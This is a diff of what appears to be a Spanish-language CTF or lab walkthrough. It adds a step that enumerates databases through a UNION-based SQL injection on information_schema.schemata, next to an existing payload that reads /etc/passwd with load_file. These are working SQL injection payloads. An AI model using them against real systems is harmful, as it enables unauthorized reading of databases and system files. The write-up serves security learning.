@@ -65,7 +65,14 @@ union select 1,2,load_file("/etc/passwd"),4,5,6,7-- -
 ```
 ![Resultado de Nmap](IMG/file.png)
 
+Vamos ahora a enumerar la base de datos que hay
 
+```
+union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- -
+```
+Vemos que no nos reporta todas las bases de datos, y esto ocurre por que el campo no te permite meterle multiple informacion
+
+![Resultado de Nmap](IMG/bd1.png)
 
 
 
